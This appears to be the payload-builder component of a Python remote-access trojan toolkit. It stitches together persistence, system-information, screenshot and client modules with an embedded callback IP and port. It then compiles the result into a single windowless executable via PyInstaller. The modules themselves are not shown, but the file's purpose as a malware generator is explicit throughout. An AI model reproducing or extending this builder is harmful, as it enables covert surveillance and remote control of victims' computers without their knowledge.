import os
import platform
import shutil
import sys
import threading
import time
import PyInstaller.__main__
from common.output import output

class GENERATOR:

    data = ""
    flname = ""

    def __init__(self, prs):
        self.address = prs.address
        self.port    = prs.port
        self.source  = prs.source
        self.persistence = prs.persistence
        self.output  = self.get_output(prs.output)
        self.pather  = self.get_path()
        self.v_imports = self.get_imports()
        self.v_consts  = self.get_consts()
        self.v_persistence = self.get_persistence()
        self.v_sysinfo = self.get_sysinfo()
        self.v_screenshot = self.get_screenshot()
        self.v_client  = self.get_client()
        self.v_main    = self.get_main()

    def get_output(self, out):
        rtval = ""
        if self.source:
            if not out.endswith(".py"):
                rtval = (out + ".py")
            else:
                rtval = out
        else:
            if platform.system() == "Windows":
                if not out.endswith(".exe"):
                    rtval = (out + ".exe")
                else:
                    rtval = out
            elif platform.system() == "Linux":
                rtval = (out)
            else:
                output.exit("Unrecognized Platform")

        return rtval

    def get_path(self):
        dirname = os.path.dirname(__file__)
        dirname = os.path.join(dirname, 'mods')
        if os.path.isdir(dirname):
            return dirname
        else:
            output.exit("Files missing to generate the payload!")

    def get_imports(self):
        topen = os.path.join(self.pather, 'imports.py')
        fl = open(topen)
        data = fl.read()
        fl.close()
        return data

    def get_consts(self):
        data = "CONSTIP = \"%s\"\nCONSTPT = %i" % (self.address, self.port)
        return data

    def get_persistence(self):
        topen = os.path.join(self.pather, "persistence.py")
        fl = open(topen)
        data = fl.read()
        fl.close()
        return data

    def get_sysinfo(self):
        topen = os.path.join(self.pather, 'sysinfo.py')
        fl = open(topen)
        data = fl.read()
        fl.close()
        return data

    def get_screenshot(self):
        topen = os.path.join(self.pather, 'screenshot.py')
        fl = open(topen)
        data = fl.read()
        fl.close()
        return data

    def get_client(self):
        topen = os.path.join(self.pather, 'client.py')
        fl = open(topen)
        data = fl.read()
        fl.close()
        return data

    def get_main(self):
        topen = os.path.join(self.pather, 'main.py')
        fl = open(topen)
        data = fl.read()
        fl.close()
        return data

    def tmp_dir(self):
        dirname = os.path.dirname(__file__)
        dirname = os.path.join(dirname, 'tmp')

        if not os.path.isdir(dirname):
            os.mkdir(dirname)

        fname   = os.path.join(dirname, 'cl.py')

        return (dirname, fname, 'cl.py')

    def patch(self):
        time.sleep(2)
        output.function("Compiling modules ... ")
        self.data = self.v_imports + "\n\n" + self.v_consts + "\n" + self.v_persistence + "\n" + self.v_sysinfo + "\n\n" + \
                self.v_screenshot + "\n\n" + self.v_client + "\n\n" + self.v_main
        time.sleep(2)
        output.function("Generating source code ...")
        fl = open(self.output, 'w')
        fl.write(self.data)
        fl.close()
        time.sleep(2)
        output.success("Code generated successfully!")
        output.success("File: " + self.output)

    def generate(self):
        time.sleep(2)
        output.function("Compiling modules ... ")
        self.data = self.v_imports + "\n\n" + self.v_consts + "\n\n" + self.v_persistence + "\n\n" + self.v_sysinfo + "\n\n" + \
                self.v_screenshot + "\n\n" + self.v_client + "\n\n" + self.v_main
        time.sleep(2)
        output.function("Generating one time code for binary ")
        self.flname = self.tmp_dir()
        fl = open(self.flname[1], 'w')
        fl.write(self.data)
        fl.close()
        output.success("Code generated successfully!")

    def compile(self):
        output.function("Compiling generated code /\\")
        counter = 1

        t = threading.Thread(target=PyInstaller.__main__.run, args=([
            '--name=%s' % os.path.basename(self.output),
            '--onefile',
            '--windowed',
            '--log-level=ERROR',
            '--distpath=%s' % os.path.dirname(self.output),
            '--workpath=%s' % self.flname[0],
            os.path.join(self.flname[0], self.flname[2])
        ],),)
        t.daemon = True
        t.start()

        while t.is_alive():
            sys.stdout.write("\r" + output.BLUE + "[" + output.UNDERLINE + ":" + output.END + output.BLUE + "] " + output.END + "Elapsed Time: %is" % (counter) + output.END)
            time.sleep(1)
            counter += 1

        sys.stdout.write("\n")
        output.success("Compiled Successfully!")

    def clean(self):
        output.function("Cleaning files and temporary codes")
        shutil.rmtree(self.flname[0])
        output.success("File: " + self.output)